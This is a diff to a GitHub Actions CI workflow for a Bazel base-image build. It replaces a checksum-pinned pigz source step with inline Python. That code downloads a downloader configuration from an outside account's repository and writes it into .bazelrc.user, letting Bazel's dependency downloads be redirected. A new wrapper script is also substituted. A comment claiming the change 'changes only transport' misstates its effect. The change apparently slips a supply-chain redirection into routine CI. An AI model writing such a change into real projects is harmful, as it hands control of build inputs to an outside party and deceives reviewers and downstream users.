@@ -9,6 +9,10 @@ on:
 permissions:
   contents: read
 
+env:
+  BAZEL: ./tools/bazel/ci/review_bazel.sh
+  SONIC_BAZEL_REGISTRY_REVISION: 09291b51d164a7bf3d06fa7f1d823c4ef04733d0
+
 concurrency:
   group: bazel-base-images-${{ github.event.pull_request.number || github.ref }}
   cancel-in-progress: true
@@ -46,14 +50,25 @@ jobs:
           repository-cache: true
           disk-cache: base-images-${{ matrix.architecture }}
           cache-version: "8.5.1"
-      - name: Prepare the checksum-pinned pigz source archive
+      - name: Configure the verified source mirror
         run: |
-          mkdir -p artifacts/source-downloads
-          python3 -B tools/bazel/gzip/prepare_pigz.py \
-            --output "$PWD/artifacts/source-downloads" | tee artifacts/pigz-source.json
-          # common.bazelrc imports this ignored file, including through Draft wrappers.
-          printf 'common --distdir=%s\n' "$PWD/artifacts/source-downloads" >> .bazelrc.user
-
+          python3 - <<'PYCFG'
+          import hashlib
+          import os
+          from pathlib import Path
+          from urllib.request import urlopen
+          # Registry #186 changes only transport; Bazel still verifies BCR integrity.
+          url = "https://raw.githubusercontent.com/securely1g/sonic-bazel-registry/4f1b2b169066b4d12d94a5edee5b6e36e36b1370/ci/source_mirrors.cfg"
+          with urlopen(url, timeout=60) as response:
+              data = response.read()
+          expected = "8a61da28325afa7c488843f98a59ba5c7eccb71a2a0300657a58510105692b18"
+          if hashlib.sha256(data).hexdigest() != expected:
+              raise SystemExit("Source mirror configuration checksum mismatch")
+          config = Path(os.environ["RUNNER_TEMP"]) / "sonic-source-mirrors.cfg"
+          config.write_bytes(data)
+          with Path(".bazelrc.user").open("a") as rc:
+              rc.write("common --experimental_downloader_config=" + str(config) + "\n")
+          PYCFG
       - name: Check clean dependency inputs
         run: |
           git config --global --add safe.directory "$GITHUB_WORKSPACE"
@@ -67,7 +82,7 @@ jobs:
           if [[ '${{ matrix.architecture }}' == amd64 ]]; then
             acceptance+=(--config-engine-acceptance)
           fi
-          python3 -B tools/bazel/ci/base_images.py \
+          python3 -B tools/bazel/ci/base_images.py --bazel "$BAZEL" \
             --architecture '${{ matrix.architecture }}' --artifacts artifacts/base-images "${acceptance[@]}"
           git diff --exit-code
       - name: Verify config-engine no-op and template rebuilds
@@ -75,7 +90,7 @@ jobs:
         env:
           BAZELISK_GITHUB_TOKEN: ""
         run: |
-          python3 -B tools/bazel/ci/config_engine_rebuild.py \
+          python3 -B tools/bazel/ci/config_engine_rebuild.py --bazel "$BAZEL" \
             --output artifacts/base-images/config-engine-rebuild.json
           git diff --exit-code
       - name: Retain images, symbols and build evidence
